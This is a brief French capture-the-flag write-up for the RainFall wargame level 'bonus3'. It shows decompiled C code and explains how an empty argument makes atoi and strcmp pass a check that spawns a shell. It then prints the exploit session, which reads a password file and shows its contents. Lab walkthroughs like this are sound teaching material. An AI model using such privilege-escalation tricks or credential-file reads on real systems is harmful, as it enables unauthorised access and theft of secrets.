# Analyse du code

```c
    iVar2 = atoi(argv[1]);
    local_98[iVar2] = '\0';
    iVar2 = strcmp(local_98,argv[1]);
	if (iVar2 == 0) {
      execl("/bin/sh","sh",0);
    }
```
Avec le code ci dessus, nous voyons que pour executer le bash il faut ivar2 == 0 et donc local98 == argv[1]. En mettant argv[1] == "".
Le resultat d'atoi est 0, ce qui fait que local_98[0] == '\0'.
le strcmp va donc comparer un NULL avec un NULL 

# Exploit

bonus3@RainFall:~$ ./bonus3 ""
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c